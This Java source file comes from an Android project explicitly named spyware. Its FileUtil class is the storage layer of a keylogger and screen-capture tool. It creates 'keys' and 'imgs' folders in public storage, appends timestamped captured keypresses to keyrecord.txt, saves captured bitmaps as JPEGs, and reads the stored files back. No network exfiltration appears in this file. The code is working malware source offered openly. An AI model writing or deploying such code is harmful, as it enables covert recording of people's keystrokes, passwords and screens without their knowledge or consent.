package com.example.cristianturetta.spyware;

import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.os.Build;
import android.os.Environment;
import android.util.Log;

import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.Locale;
import java.util.Random;

public class FileUtil {

    private File malwareKeypressStorageFolder;
    private File malwareImagesStorageFolder;
    private final String keypressFileName = "keyrecord.txt";

    private static FileUtil mInstance;

    private FileUtil() {


        malwareKeypressStorageFolder = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS),
                "keys");
        malwareImagesStorageFolder = new File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DCIM),
                "imgs");



        if(!malwareKeypressStorageFolder.exists())
            if (FileUtil.isExternalStorageWritable())
                if (!malwareKeypressStorageFolder.mkdirs()) {
                    Log.e("FileUtil", "Key directory not created");
                }

        if(!malwareImagesStorageFolder.exists())
            if (FileUtil.isExternalStorageWritable())
                if (!malwareImagesStorageFolder.mkdirs()) {
                    Log.e("FileUtil", "Key directory not created");
                }


    }


    public static FileUtil getInstance() {
        if (mInstance == null) {
            synchronized (FileUtil.class) {
                if (mInstance == null) {
                    mInstance = new FileUtil();
                }
            }
        }
        return mInstance;
    }


    private static boolean isExternalStorageWritable() {
        String state = Environment.getExternalStorageState();
        if (Environment.MEDIA_MOUNTED.equals(state)) {
            return true;
        }
        return false;
    }




    public String getMalwareKeypressStorageFolder() {
        return malwareKeypressStorageFolder.getAbsolutePath();
    }

    public String getMalwareImagesStorageFolder() {
        return malwareImagesStorageFolder.getAbsolutePath();
    }

    public String getKeypressFileName() {
        return keypressFileName;
    }


    /**
     * Stores the given {@link Bitmap} to a path on the device.
     *
     * @param bitmap   The {@link Bitmap} that needs to be stored
     * @param filePath The path in which the bitmap is going to be stored.
     */
    public void storeBitmap(Bitmap bitmap, String filePath) {
        File imageFile = new File(filePath);
        imageFile.getParentFile().mkdirs();
        try {
            OutputStream outputStream = new FileOutputStream(imageFile);
            bitmap.compress(Bitmap.CompressFormat.JPEG, 90, outputStream);
            outputStream.flush();
            outputStream.close();
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    /**
     * Stores the keypresses into malware root folder
     *
     * @param key the keypress to store
     */
    public void storeKeypress(String key) {

        DateFormat df = new SimpleDateFormat("dd/MM/yyyy-HH:mm:ss z :", Locale.ITALIAN);
        String time = df.format(Calendar.getInstance().getTime());


        File keypressFile = new File(malwareKeypressStorageFolder, keypressFileName);
        FileWriter writer;

        String toWrite = time + key;

        try {
            writer = new FileWriter(keypressFile, true);
            writer.append(toWrite);
            writer.flush();
            writer.close();
        } catch (IOException e) {
            Log.e("storeKeypress", e.getLocalizedMessage());
        }


    }

    public void deleteKeypressFile() {
        File keypressFile = new File(malwareKeypressStorageFolder, keypressFileName);
        keypressFile.delete();
    }

    private static String convertStreamToString(InputStream is) throws Exception {
        BufferedReader reader = new BufferedReader(new InputStreamReader(is));
        StringBuilder sb = new StringBuilder();
        String line = null;
        while ((line = reader.readLine()) != null) {
            sb.append(line).append("\n");
        }
        reader.close();
        return sb.toString();
    }

    public static String getStringFromFile(String filePath) throws Exception {
        try {
            File fl = new File(filePath);
            FileInputStream fin = new FileInputStream(fl);
            String ret = convertStreamToString(fin);
            //Make sure you close all streams.
            fin.close();
            return ret;
        } catch (Exception e) {
            e.printStackTrace();
        }
        return null;
    }

    /**
     * Gives an {@link ArrayList<File>} of JPG images.
     *
     * @param path The {@link File} of the directory containing screenshots
     */
    public ArrayList<File> getAllImagesFrom(File path) {
        File[] allFiles = path.listFiles();
        ArrayList<File> allImages = new ArrayList<>();
        for (File file : allFiles) {
            if (file.getName().endsWith(".jpg")) {
                allImages.add(file);
            }
        }
        return allImages;
    }
}